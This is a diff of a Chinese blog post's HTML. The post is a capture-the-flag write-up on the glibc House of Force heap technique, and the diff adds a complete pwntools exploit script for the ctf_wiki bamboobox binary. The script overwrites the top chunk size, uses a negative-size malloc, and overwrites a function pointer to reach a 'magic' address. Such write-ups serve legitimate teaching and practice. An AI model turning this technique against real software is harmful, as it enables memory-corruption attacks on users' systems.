@@ -290,7 +290,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">898</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -431,6 +431,7 @@ height:50vh;
 </ol>
 <p>简而言之，如果我现在能够进行堆溢出，修改 ==top_chunk== 的 ==size==， 并且拥有两次能够任意控制大小的 ==malloc== 的机会，通过构造payload， 可以实现任意地址写。</p>
 <h4 id="步骤">步骤</h4>
+<p>以 ctf_wiki - bamboo 为例子</p>
 <ol>
 <li>填充 top_chunk_size</li>
 </ol>
@@ -462,6 +463,7 @@ height:50vh;
 <li>写数据</li>
 </ol>
 <p>再进行一次 malloc，但是要保证 ==new_chunk_size + 0x10 &lt;= top_chunk_size==，这样，glibc就在我们期望的地方申请了区块，就可以对其进行操作了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D49</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, data)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Please enter the length of item name:'</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">'Please enter the name of item:'</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, length, data)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Please enter the index of item:'</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'Please enter the length of item name:'</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">'Please enter the new name of the item:'</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exitpwn</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice:'</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'mrh929'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, 'b *0x400A6F')</span></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x41</span>, <span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, 'b *0x400A6F')</span></span><br><span class="line">offset = <span class="number">-0x60</span> - <span class="number">0x8</span> <span class="number">-0x7</span></span><br><span class="line">add(offset, <span class="string">'bbbbbbbbbbbbbbbb'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'c'</span>*<span class="number">0x8</span> + p64(magic))</span><br><span class="line"></span><br><span class="line">exitpwn()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h4 id="PS">PS</h4>
 <ol>
 <li>
@@ -480,7 +482,7 @@ height:50vh;
             <p>原文作者：<a href="https://mrh1s.top">mrh929</a>
             </p><p>原文链接：<a href="https://mrh1s.top/posts/7532c0cc/">https://mrh1s.top/posts/7532c0cc/</a>
             </p><p>发表日期：<a href="https://mrh1s.top/posts/7532c0cc/">June 14th 2020, 5:28:23 pm</a>
-            </p><p>更新日期：<a href="https://mrh1s.top/posts/7532c0cc/">June 14th 2020, 6:08:43 pm</a>
+            </p><p>更新日期：<a href="https://mrh1s.top/posts/7532c0cc/">June 14th 2020, 6:14:47 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
